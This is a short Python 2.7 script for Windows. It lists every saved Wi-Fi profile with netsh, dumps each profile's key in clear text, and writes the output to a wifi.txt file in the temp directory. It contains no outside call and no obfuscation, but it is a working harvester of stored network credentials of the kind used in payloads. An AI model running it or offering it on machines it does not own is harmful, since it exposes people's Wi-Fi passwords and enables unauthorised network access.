# Use python2.7 because of Regular Expression working weird
import os, re, tempfile

def execute():
	networks = os.popen("netsh wlan show profile").read()
	profile_list = re.findall("(?:Profile\s*:\s)(.*)",networks) # ?: means dont add this to the result but still look for it
	results = []
	for profile in profile_list:
		results.append(os.popen("netsh wlan show profile \"" + profile + "\" key=clear").read())

	with open(tempfile.gettempdir()+"\wifi.txt","w") as file:
		for result in results:
			file.write(result)

if __name__ == "__main__":
	execute()

